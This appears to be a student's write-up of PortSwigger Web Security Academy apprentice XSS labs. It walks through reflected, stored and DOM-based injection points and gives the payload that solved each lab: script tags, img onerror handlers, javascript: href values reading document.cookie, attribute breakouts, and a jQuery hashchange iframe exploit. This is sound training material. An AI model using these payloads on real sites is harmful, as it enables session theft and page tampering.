---
title: XSS - APPRENTICE
tags: [Portswigger Web Security Academy, Web]

category: "Security/Practice/Portswigger Web Security Academy/XSS"
---

# XSS - APPRENTICE
###### tags: `Portswigger Web Security Academy` `Web`
[TOC]

## Lab: Reflected XSS into HTML context with nothing encoded:zero:
* Description: This lab contains a simple reflected cross-site scripting vulnerability in the search functionality. 
* Goal: To solve the lab, perform a cross-site scripting attack that calls the alert function.

### Exp
Payload: `<script>alert(123)</script>`
:::spoiler Success Screenshot
![](https://i.imgur.com/tvfxD4P.png)
:::


---

## Lab: Stored XSS into HTML context with nothing encoded
* Description: This lab contains a stored cross-site scripting vulnerability in the comment functionality. 
* Goal:  To solve this lab, submit a comment that calls the alert function when the blog post is viewed. 

### Exp
You need to click into one post and comment something that contained script tag.
Payload: `<script>alert(123)</script>`
:::spoiler Success Screenshot
![](https://i.imgur.com/aArBCbN.png)
:::


---

## Lab: DOM XSS in `document.write` sink using source `location.search`
* Description: This lab contains a `DOM-based` cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL. 
* Goal: To solve this lab, perform a cross-site scripting attack that calls the alert function.

### Recon
1. Tried in random strings
I tried everything I learned but nothing prompt appeared. But, I noticed something strange using view page source and inspect.
Payload: `<script>alert(123)</script>`
![](https://i.imgur.com/2euiFeA.png)
You can see that the normal payload is not working, however, there has another place to inject script tag $\to$ `document.write(...)`
So, I inspect it in original page
![](https://i.imgur.com/NCJUJXj.png)

### Exp
Payload: `"><script>alert(123)</script>"`
:::spoiler Success Screenshot
![](https://i.imgur.com/X801Wgo.png)
![](https://i.imgur.com/RIGDA9b.png)
:::


---

## Lab: DOM XSS in `innerHTML` sink using source `location.search`
* Description: This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`. 
* Goal:  To solve this lab, perform a cross-site scripting attack that calls the alert function. 

### Recon
:::spoiler Source Code
```javascript!
...
<section class=blog-header>
    <h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
    <script>
        function doSearchQuery(query) {
            document.getElementById('searchMessage').innerHTML = query;
        }
        var query = (new URLSearchParams(window.location.search)).get('search');
        if(query) {
            doSearchQuery(query);
        }
    </script>
    <hr>
</section>
...
```
:::
1. Input `abc` and observe page source
![](https://i.imgur.com/sc3QWXN.png)

2. Input `<script>alert(123)</script>` and observe page source
![](https://i.imgur.com/ZW6WvOn.png)
Nothing prompt appeared though it's included in `span` tag

3. So, how about using `img` tag to achieve XSS?

### Exp
Payload: `<img src=1 onerror=alert(1)>`
![](https://i.imgur.com/FonVo3L.png)
It's rendered successfully.
:::spoiler Success Screenshot
![](https://i.imgur.com/fcXrlDu.png)
:::



---

## Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
* Description: This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the `jQuery` library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`. 
* Goal: To solve this lab, make the "back" link alert document.cookie.

### Recon
According to the description and our goal, we must find where `back` is. By using the string search of each page, I found it in `feedback` sub-page.
:::spoiler Source code
```javascript!
...
<div class="is-linkback">
    <a id="backLink">Back</a>
</div>
<script>
    $(function() {
        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
</script>
...
```
:::
According to the source code, we can inject some malicious path to replace `/`

### Exp
Payload: `/feedback?returnPath=javascript:alert(document.cookie);`
After you modified the URL, then you hit enter and click `Back` button down the page. Then it should be triggered.
:::spoiler Result
![](https://i.imgur.com/Zjd2Jm7.png)

![](https://i.imgur.com/JRpKTAq.png)
:::

### Reference
[PortSwigger Labs - DOM XSS in jQuery anchor href attribute sink using location.search source](https://youtu.be/RmyZgpqMfcM)
[DOM XSS in jQuery anchor href attribute sink using ... (Video solution, Audio)](https://youtu.be/B2E9cEZQQXg)
:::spoiler [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
> If a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. For instance, jQuery's attr() function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the attr() function, then it may be possible to manipulate the value sent to cause XSS. For example, here we have some JavaScript that changes an anchor element's href attribute using data from the URL: 
> ```javascript
> $(function() {
>	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
> });
>```
:::

---

## Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
* Description: This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string.
* Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

### Recon
1. We have to find where can inject XSS attack
If we input `abc` in search box, there're 2 place can be injected
![](https://i.imgur.com/cjpvpqm.png)

2. Then how about `<script>alert(123)</script>`
![](https://i.imgur.com/BirS8Eu.png)
Seems it's not working here. So, we should find another payload to inject.

3. Try New payload
Payload: `'abc` $\to$ Seems safe for `'` character
![](https://i.imgur.com/GM2bPJx.png)
    
    ---
    Payload: `//abc` $\to$ Seems safe for `//` character
    ![](https://i.imgur.com/nzd4iF4.png)


### Exp
Why we don't inject into 2nd place?
Payload: `\\';alert(123);//` or `';alert(123);//`
:::spoiler Success Screenshot
![](https://i.imgur.com/IOBX0oq.png)

![](https://i.imgur.com/PKUYHuo.png)
:::


---

## Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded
* Description: This lab contains a stored cross-site scripting vulnerability in the comment functionality.
* Goal: To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

### Recon
1. Find the place to inject
According to the description, we know that the comment place has a injection place.
Comment: `abc`
Name: `aaa`
Email: `a@gmail.com`
Website: `https://test.sbkblog.online`
![](https://i.imgur.com/6utKpWm.png)

2. How about script tag input
Comment: `<script>alert(123)</script>`
![](https://i.imgur.com/TWJV4F3.png)
Seems not working here

3. How about inject into website place?
Website: `https://test.sbkblog.online"<script>alert(123)</script>//`
![](https://i.imgur.com/kfP6IeN.png)
Still not working here

4. <font color="FF0000">According to **Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source**</font>
We know that we can inject XSS in `href` attribute by using the payload: `javascript:alert(1)`

### Exp
Website Payload: `javascript:alert(1)`
![](https://i.imgur.com/u6COY4h.png)

:::spoiler Success Screenshot
![](https://i.imgur.com/Qj21zuC.png)
:::


---

## Lab: Reflected XSS into attribute with angle brackets HTML-encoded
* Description: This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded.
* Goal: To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.

### Recon
1. Find the place to inject
Input: `abc`
![](https://i.imgur.com/RfMiJ1W.png)
Seems we have 2 candidates

2.  How about script tag
Input: `<script>alert(123)</script>`
![](https://i.imgur.com/mLhHdgh.png)
Seems angle brackets are HTML-encoded and not working properly.

3. How about `href` attribute?
Input: `"javascript:alert(123)`
![](https://i.imgur.com/NNm3USg.png)
Still not working for input tag.

### Exp - <font color="FF0000">New payload</font>
Input: `" onmouseover="alert(1)`
![](https://i.imgur.com/BDO0c0s.png)

:::spoiler Success Screenshot
![](https://i.imgur.com/jvGdCEE.png)
:::


---

## Lab: DOM XSS in jQuery selector sink using a hashchange event:four:
* Description: This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property. 
* Goal: To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

### [Background - DOM XSS in jQuery](https://portswigger.net/web-security/cross-site-scripting/dom-based)
簡單來說，有些頁面支援`jQuery`的`location.hash`功能，也就是在URL的末端添加`#XXX`，前端會自動scrolling到對應的位置(就是Github那樣)，文章中有提到如果hash是使用者可以控制的，攻擊者可以使用它來將 XSS 向量注入 `$()` seletor接收器。 較新版本的`jQuery`已通過阻止使用者在輸入以hash character(#)開頭時將 HTML 注入seletor來修補此特定漏洞。
Payload for example: `<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`

### Recon
1. Find the specific place to inject
![](https://i.imgur.com/hYcpZBn.png)

2. Follow the background reference to create the new payload

### Exp - `jQuery location.hash` vulnerability
Payload: `<iframe src="https://0aab00ee04037bdb802cc6c600230039.web-security-academy.net/#" onload="this.src+='<img src=xxx onerror=print()>'"></iframe>`
:::spoiler Success Screenshot
![](https://i.imgur.com/nOSouuD.png)
:::

### Reference
[Lab DOM XSS in jQuery Selector Sink Using a Hash Change Event](https://youtu.be/k4kpc0b8p5U)

## Reference
[Burp Suite Security Academy Writeup](https://github.com/frank-leitner/portswigger-websecurity-academy)